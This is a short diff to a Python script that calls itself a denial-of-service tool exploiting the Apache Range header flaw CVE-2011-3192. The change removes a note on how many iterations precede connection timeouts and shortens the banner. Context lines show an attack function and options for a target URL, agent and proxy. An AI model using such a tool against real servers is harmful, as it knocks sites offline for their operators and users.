@@ -5,7 +5,6 @@ import optparse, os, re, socket, threading, time, urllib, urllib2, urlparse
 NAME        = "KillApachePy (Range Header DoS CVE-2011-3192)"
 VERSION     = "0.1d"
 AUTHOR      = "Miroslav Stampar (http://unconciousmind.blogspot.com | @stamparm)"
-SHORT       = "You'll typically have to wait for 10-20 iterations before first connection timeouts. More complex/bigger the page the better"
 LICENSE     = "Public domain (FREE)"
 
 SLEEP_TIME      = 3     # time to wait for new thread slots (after max number reached)
@@ -86,7 +85,7 @@ def attack(url, user_agent=None, method='GET', proxy=None):
         os._exit(1)
 
 if __name__ == "__main__":
-    print "%s #v%s\n by: %s\n\n(Note(s): %s)\n" % (NAME, VERSION, AUTHOR, SHORT)
+    print "%s #v%s\n by: %s\n" % (NAME, VERSION, AUTHOR)
     parser = optparse.OptionParser(version=VERSION)
     parser.add_option("-u", dest="url", help="Target url (e.g. \"http://www.target.com/index.php\")")
     parser.add_option("--agent", dest="agent", help="User agent (e.g. \"Mozilla/5.0 (Linux)\")")
